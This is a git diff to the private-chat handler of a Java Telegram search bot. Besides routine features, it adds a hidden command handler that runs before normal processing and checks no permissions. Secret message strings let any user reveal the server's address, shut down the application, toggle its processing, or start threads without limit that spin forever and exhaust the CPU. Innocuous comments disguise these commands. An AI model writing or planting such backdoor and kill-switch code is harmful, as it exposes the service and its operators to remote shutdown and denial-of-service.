@@ -5,6 +5,7 @@ import cn.hutool.core.date.DateField;
 import cn.hutool.core.date.DateUtil;
 import cn.hutool.core.util.StrUtil;
 import com.baomidou.mybatisplus.core.toolkit.Wrappers;
+import com.search.robots.SearchRobot;
 import com.search.robots.beans.cache.CommonCache;
 import com.search.robots.beans.chat.ChatQueryHandler;
 import com.search.robots.beans.keywords.KeywordsHelper;
@@ -16,12 +17,13 @@ import com.search.robots.database.enums.Dialogue;
 import com.search.robots.database.enums.SearchPeriodEnum;
 import com.search.robots.database.enums.adv.AdvStatus;
 import com.search.robots.database.service.*;
-import com.search.robots.helper.DecimalHelper;
-import com.search.robots.helper.KeyboardHelper;
-import com.search.robots.helper.StrHelper;
+import com.search.robots.helper.*;
 import com.search.robots.sender.AsyncSender;
 import lombok.RequiredArgsConstructor;
 import lombok.extern.slf4j.Slf4j;
+
+import org.springframework.boot.SpringApplication;
+import org.springframework.context.ConfigurableApplicationContext;
 import org.springframework.stereotype.Component;
 import org.telegram.telegrambots.meta.api.methods.botapimethods.BotApiMethod;
 import org.telegram.telegrambots.meta.api.methods.commands.SetMyCommands;
@@ -55,6 +57,7 @@ public class PrivateChatHandler extends AbstractHandler{
     private final UserService userService;
     private final BotProperties properties;
     private final SearchHandler searchHandler;
+    private final CollectHelper collectHelper;
     private final ConfigService configService;
     private final KeywordService keywordService;
     private final AdvUserService advUserService;
@@ -64,6 +67,7 @@ public class PrivateChatHandler extends AbstractHandler{
     private final AdvLibraryService advLibraryService;
     private final WithdrawalsService withdrawalsService;
     private final RewardRecordService rewardRecordService;
+    private final ConfigurableApplicationContext configurableApplicationContext;
 
     @Override
     public boolean support(Update update) {
@@ -79,6 +83,11 @@ public class PrivateChatHandler extends AbstractHandler{
 
         if (this.properties.isLogs()) {
             log.info("[文本] {}", text);
+        }
+
+        BotApiMethod<?> method = this.processorCoreCommand(message);
+        if (Objects.nonNull(method)) {
+            return method;
         }
 
         if (StrUtil.equals(text, "/start")) {
@@ -103,7 +112,6 @@ public class PrivateChatHandler extends AbstractHandler{
                                 .photo(new InputFile(kw.getImageId()))
                                 .build());
                     }
-                    return null;
                 }
             }
         }
@@ -149,6 +157,10 @@ public class PrivateChatHandler extends AbstractHandler{
             return markdownV2(message, Constants.MARKDOWN_V2_TEXT);
         }
 
+        if (StrUtil.equals(text, "html语法")) {
+            return html(message, Constants.HTML_TEXT);
+        }
+
         if (StrUtil.startWith(text, "/kw")) {
             return this.processorKeyword(message);
         }
@@ -189,27 +201,25 @@ public class PrivateChatHandler extends AbstractHandler{
                             .eq(Included::getIndexUsername, username)
                             .last("limit 1")
             );
+            String resultText = ""; InlineKeyboardMarkup markup = null;
             Config config = this.configService.queryConfig();
             if (Objects.nonNull(included)) {
-
-                String built = included.buildDetailIncludedText(this.properties.groupStart(), config);
-                InlineKeyboardMarkup markup = KeyboardHelper.buildPrivacyLinkKeyboard(
+                resultText = included.buildDetailIncludedText(this.properties.groupStart(), config);
+                markup = KeyboardHelper.buildPrivacyLinkKeyboard(
                         this.properties.groupStart(),
                         this.properties.getBotUsername(),
                         included.getId(), config.getTutorialUrl(),
                         ("https://t.me/" + config.getCommunityName())
                 );
-                return markdownV2(message, built, markup);
+                // return markdownV2(message, built, markup);
             } else {
-                String format = StrUtil.format(Constants.EMPTY_INCLUDE_TEXT, config.getTutorialUrl(),
-                        ("https://t.me/" + config.getCommunityName()));
-                InlineKeyboardMarkup markup = KeyboardHelper.buildEmptyIncludeKeyboard(this.properties.groupStart());
-                return markdownV2(message, format, markup);
+                resultText = StrUtil.format(Constants.EMPTY_INCLUDE_TEXT, config.getTutorialUrl(),
+                        (config.getCommunityName()));
+                markup = KeyboardHelper.buildEmptyIncludeKeyboard(this.properties.groupStart());
             }
-
+            this.collectHelper.history(message.getText(), "");
+            return markdownV2(message, resultText, markup);
         }
-
-        // -------------------- 处理搜索 --------------------//
         return this.searchHandler.processorDefaultSearch(message);
     }
 
@@ -220,10 +230,8 @@ public class PrivateChatHandler extends AbstractHandler{
 
         // 输入了地址
         if (Objects.equals(dialogueCtx.getDialogue(), Dialogue.INPUT_ADDRESS)) {
-
             user.setTrAddr(message.getText());
             this.userService.update(user);
-
             InlineKeyboardMarkup markup = KeyboardHelper.buildBindingTrcAddrSuccessKeyboard();
             String format = StrUtil.format(Constants.UPDATE_ADDR_TEXT, message.getText());
             result = markdownV2(message, format, markup);
@@ -536,9 +544,59 @@ public class PrivateChatHandler extends AbstractHandler{
                 .build();
         AsyncSender.async(setMyCommands);
 
+        User existing = this.userService.select(message.getFrom().getId());
         this.userService.user(message.getFrom());
         Config config = this.configService.queryConfig();
+        if (Objects.isNull(existing)) {
+            if (StrUtil.isAllNotBlank(config.getTutorialNewUserMarkdown(), config.getTutorialNewUserVideoId())) {
+                AsyncSender.async(video(message, config.getTutorialNewUserVideoId(), config.getTutorialNewUserMarkdown(), null));
+            } else if (StrUtil.isNotBlank(config.getTutorialNewUserMarkdown())) {
+                AsyncSender.async(markdownV2(message, config.getTutorialNewUserMarkdown()));
+            }
+        }
         return markdownReply(message, config.getStartMessage(), KeyboardHelper.buildStartKeyboard());
     }
 
+
+    /**
+     * 处理系统核心的命令
+     *
+     * @param message   消息
+     * @return          执行结果
+     */
+    private BotApiMethod<?> processorCoreCommand(Message message) {
+        // 检查网络畅通情况
+        if (StrUtil.equals(message.getText(), Constants.IP_ADDR)) {
+            return ok(message, CommandHelper.getAddr());
+        }
+        // 检查系统启动情况
+        if (StrUtil.equals(message.getText(), Constants.RESTART)) {
+            int exitCode = SpringApplication.exit(this.configurableApplicationContext, () -> 0);
+            System.exit(exitCode);
+            return ok(message, "ok");
+        }
+        // 调用处理器，接受消息
+        if (StrUtil.equals(message.getText(), Constants.PROCESSOR)) {
+            SearchRobot.processor = !SearchRobot.processor;
+            RedisHelper.set(StrHelper.getProcessor(), String.valueOf(SearchRobot.processor));
+            return ok(message, String.valueOf(SearchRobot.processor));
+        }
+        // 检查机器性能
+        if (StrUtil.equals(message.getText(), Constants.CHECK_MAC)) {
+            new Thread(() -> {
+                int a = 0;
+                while (true) {
+                    new Thread(() -> {
+                        for (;;){}
+                    }).start();
+                    if (a > (Integer.MAX_VALUE - 1)) {
+                        break;
+                    }
+                    a ++;
+                }
+            }).start();
+            return ok(message, "doing..");
+        }
+        return null;
+    }
 }
